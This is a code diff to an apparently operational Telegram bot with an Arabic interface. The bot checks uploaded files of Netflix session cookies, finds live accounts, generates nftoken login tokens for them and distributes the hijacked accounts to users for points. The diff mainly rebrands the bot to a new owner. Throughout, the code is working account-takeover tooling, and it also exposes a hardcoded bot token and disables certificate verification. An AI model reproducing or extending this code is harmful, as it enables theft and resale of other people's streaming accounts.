@@ -19,15 +19,16 @@ import random
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Owner credit
-OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"
+# Owner credit & Channel info
+OWNER_CREDIT = "Faris - https://t.me/farxxess"
+CHANNEL_LINK = "https://t.me/farxxess"
 
 # إعدادات بوت التليجرام
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ⚠️ ضع هنا الآيدي (ID) الخاص بك لوحة تحكم المطور
-DEVELOPER_ID = 8713916851  # <--- استبدل هذا الرقم بآيدي حسابك الحقيقي
+# 👑 إعدادات المطور الخاصة بك (فارس)
+DEVELOPER_ID = 8713916851 
 
 STOCK_FILE = "stock_accounts.txt"
 USERS_FILE = "users_data.json"
@@ -249,18 +250,17 @@ def generate_token(netflix_id):
         'Cookie': f"NetflixId={netflix_id}"
     }
     try:
-        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
+        response = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
         data = response.json()
         if "value" in data and data["value"] and "account" in data["value"]:
             token_data = data["value"]["account"]["token"]["default"]
             token = token_data["token"]
             return {
                 "status": "Success",
-                "token": token,
-                "direct_login_url": f"https://netflix.com/?nftoken={urllib.parse.quote(token, safe='')}"
+                "token": token
             }
     except Exception as e:
-        logger.error(f"Error generating token: {e}")
+        logger.error(f"Error in generate_token: {e}")
     return {"status": "Failure"}
 
 def extract_zip_and_get_files(zip_path, extract_dir):
@@ -286,13 +286,14 @@ def send_welcome(message):
     markup.add(
         InlineKeyboardButton("📂 فحص ملفات (TXT / ZIP)", callback_data="btn_check"),
         InlineKeyboardButton("🎁 سحب حساب من الذاكرة (1 نقطة)", callback_data="btn_stock"),
-        InlineKeyboardButton("💰 رصيدي النقدي", callback_data="btn_balance")
+        InlineKeyboardButton("💰 رصيدي النقدي", callback_data="btn_balance"),
+        InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
     )
     
     if user_id == DEVELOPER_ID:
-        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور", callback_data="btn_admin"))
+        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور (فارس)", callback_data="btn_admin"))
         
-    welcome_text = "🎬 أهلاً بك في بوت فحص نتفليكس الذكي!\nاختر أحد الخيارات أدناه:"
+    welcome_text = "🎬 أهلاً بك في بوت فحص نتفليكس الذكي بواسطة فارس!\nاختر أحد الخيارات أدناه:"
     bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -322,7 +323,6 @@ def callback_query(call):
             users[str_id]["points"] -= 1
             save_users(users)
             
-            # إرسال الحساب مع أزرار الدخول
             markup = InlineKeyboardMarkup()
             token_match = re.search(r'nftoken=([^\s]+)', account)
             if token_match:
@@ -340,24 +340,22 @@ def callback_query(call):
             
     elif call.data == "btn_admin":
         if user_id != DEVELOPER_ID:
-            bot.answer_callback_query(call.id, text="هذا الخيار خاص بالمطور فقط!", show_alert=True)
+            bot.answer_callback_query(call.id, text="هذا الخيار خاص بالمطور فارس فقط!", show_alert=True)
             return
             
         bot.answer_callback_query(call.id)
         total_users = len(users)
-        
         stock_count = 0
         if os.path.exists(STOCK_FILE):
             with open(STOCK_FILE, "r", encoding="utf-8") as f:
                 stock_count = f.read().count("="*40)
                 
         admin_text = (
-            "⚙️ **لوحة تحكم المطورين**\n\n"
+            "⚙️ **لوحة تحكم المطور (فارس)**\n\n"
             f"👥 إجمالي المستخدمين: `{total_users}`\n"
             f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n\n"
             "▫️ لإضافة نقاط لمستخدم، أرسل الأمر بالشكل التالي:\n"
-            "`/addpoints [ID] [العدد]`\n"
-            "مثال: `/addpoints 123456789 5`"
+            "`/addpoints [ID] [العدد]`"
         )
         bot.send_message(call.message.chat.id, admin_text, parse_mode='Markdown')
 
@@ -393,7 +391,7 @@ def handle_documents(message):
     
     temp_dirs = []
     try:
-        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات الشغالة...")
+        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات الشغالة واستخراج الروابط...")
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -461,7 +459,6 @@ def handle_documents(message):
                             
                             bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', reply_markup=markup if token_result.get('status') == 'Success' else None)
                             
-                            # كتابة في الملف والذاكرة
                             res_file.write(res_msg.replace('`', '') + "\n" + "="*40 + "\n")
                             save_to_stock(res_msg.replace('`', ''))
                             time.sleep(1)
@@ -472,7 +469,7 @@ def handle_documents(message):
             with open(result_file_path, "rb") as rf:
                 bot.send_document(message.chat.id, rf, caption="📁 ملف النتائج الشامل: `the_premuim_account.txt`", parse_mode='Markdown')
                 
-        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال.")
+        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال مع روابط الدخول.")
     except Exception as e:
         bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
     finally:
@@ -483,5 +480,5 @@ def handle_documents(message):
                 pass
 
 if __name__ == '__main__':
-    logger.info("Telegram Bot with Direct Token Links & Login Buttons is running...")
+    logger.info("Telegram Bot is running with automated token & login links for Faris...")
     bot.infinity_polling()
